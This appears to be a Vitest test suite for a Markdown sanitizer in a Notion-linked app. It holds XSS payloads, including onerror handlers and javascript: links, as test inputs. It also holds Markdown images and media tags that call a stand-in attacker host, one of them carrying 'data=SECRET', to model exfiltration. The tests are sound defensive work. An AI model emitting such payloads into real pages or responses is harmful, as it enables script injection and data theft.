// @vitest-environment jsdom
import { describe, expect, it } from 'vitest'
import { renderMarkdown } from '../src/lib/markdown'

describe('renderMarkdown', () => {
  it('renders headings, lists and bold', () => {
    const html = renderMarkdown('# Title\n\n- **a**\n- b')
    expect(html).toContain('<h1')
    expect(html).toContain('<strong>a</strong>')
    expect(html).toContain('<li>')
  })

  it('renders gfm line breaks', () => {
    const html = renderMarkdown('one\ntwo')
    expect(html).toMatch(/<br/)
  })

  it('strips script tags and inline handlers', () => {
    const html = renderMarkdown('hello <script>alert(1)</script><img src=x onerror=alert(1)>')
    expect(html).not.toContain('<script')
    expect(html).not.toContain('onerror')
  })

  it('removes style tags and iframes', () => {
    const html = renderMarkdown('<style>body{}</style><iframe src="https://x"></iframe>ok')
    expect(html).not.toContain('<style')
    expect(html).not.toContain('<iframe')
  })

  it('blocks javascript: urls but keeps https', () => {
    const evil = renderMarkdown('[x](javascript:alert(1)) [y](https://example.com)')
    expect(evil).not.toContain('javascript:')
    expect(evil).toContain('https://example.com')
  })

  it('keeps notion: page links and chips them for the UI', () => {
    const id = 'a'.repeat(32)
    const html = renderMarkdown(`[Second Brain](notion://page/${id})`)
    expect(html).toContain(`data-page-id="aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa"`)
    expect(html).toContain('nox-source-chip')
  })

  it('renders fenced code blocks escaped', () => {
    const html = renderMarkdown('```\n<script>alert(1)</script>\n```')
    expect(html).toContain('<code')
    expect(html).not.toContain('<script>')
  })

  it('converts Markdown images to clickable links without autoloading', () => {
    const html = renderMarkdown('![preview](https://attacker.invalid/collect?data=SECRET)')
    expect(html).not.toContain('<img')
    expect(html).not.toContain('src=')
    expect(html).toContain('https://attacker.invalid/collect?data=SECRET')
    expect(html).toContain('<a')
    expect(html).toContain('preview')
  })

  it('removes raw image/media sinks without leaving source attributes', () => {
    const html = renderMarkdown([
      '<img src="https://attacker.invalid/x.png" onerror="alert(1)">',
      '<picture><source srcset="https://attacker.invalid/a.png 1x, https://attacker.invalid/b.png 2x"><img src="https://attacker.invalid/fallback.png"></picture>',
      '<video poster="https://attacker.invalid/poster.png"><source src="https://attacker.invalid/v.mp4"></video>',
      '<audio src="https://attacker.invalid/a.mp3"></audio>',
      '<track src="https://attacker.invalid/t.vtt">',
      '<object data="https://attacker.invalid/o.swf"></object>',
      '<embed src="https://attacker.invalid/e.swf">',
      '<link rel="stylesheet" href="https://attacker.invalid/s.css">',
      '<meta http-equiv="refresh" content="0;url=https://attacker.invalid/">',
      'after',
    ].join('\n'))
    expect(html).not.toMatch(/<img/i)
    expect(html).not.toMatch(/<picture/i)
    expect(html).not.toMatch(/<source/i)
    expect(html).not.toMatch(/<video/i)
    expect(html).not.toMatch(/<audio/i)
    expect(html).not.toMatch(/<track/i)
    expect(html).not.toMatch(/<object/i)
    expect(html).not.toMatch(/<embed/i)
    expect(html).not.toMatch(/<link/i)
    expect(html).not.toMatch(/<meta/i)
    expect(html).not.toContain('src=')
    expect(html).not.toContain('srcset')
    expect(html).not.toContain('poster=')
    expect(html).toContain('after')
  })

  it('removes SVG resource features and CSS URL attempts', () => {
    const html = renderMarkdown([
      '<svg><image href="https://attacker.invalid/s.svg" /></svg>',
      '<svg><use href="https://attacker.invalid/u.svg#x"></use></svg>',
      '<div style="background-image:url(https://attacker.invalid/bg.png)">styled</div>',
      '<style>@import url(https://attacker.invalid/a.css);</style>',
    ].join('\n'))
    expect(html).not.toMatch(/<svg/i)
    expect(html).not.toContain('attacker.invalid/s.svg')
    expect(html).not.toContain('attacker.invalid/u.svg')
    expect(html).not.toContain('attacker.invalid/bg.png')
    expect(html).not.toContain('attacker.invalid/a.css')
    expect(html).not.toContain('style=')
    expect(html).toContain('styled')
  })

  it('keeps ordinary links clickable and preserves code and tables', () => {
    const html = renderMarkdown('[docs](https://example.com/page)\n\n| a | b |\n|---|---|\n| 1 | 2 |\n\n`![not-an-image](https://example.com/x.png)`')
    expect(html).toContain('href="https://example.com/page"')
    expect(html).toContain('target="_blank"')
    expect(html).toContain('<table')
    expect(html).toContain('<code')
    expect(html).not.toContain('<img')
  })

  it('does not convert image syntax inside fenced code blocks', () => {
    const html = renderMarkdown('```\n![preview](https://attacker.invalid/collect)\n```')
    expect(html).toContain('<code')
    expect(html).not.toContain('<a')
    expect(html).not.toContain('<img')
  })
})

it('normalizes dashed and uppercase Notion IDs into safe browser links', () => {
  const id = 'ABCDEFAB-CDEF-ABCD-EFAB-CDEFABCDEFAB'
  const html = renderMarkdown(`[Source](notion://page/${id})`)
  expect(html).toContain('href="https://www.notion.so/abcdefabcdefabcdefabcdefabcdefab"')
  expect(html).toContain('target="_blank"')
  expect(html).toContain('noopener')
  expect(renderMarkdown('[bad](notion://page/-------------------------------a)')).not.toContain('href=')
})
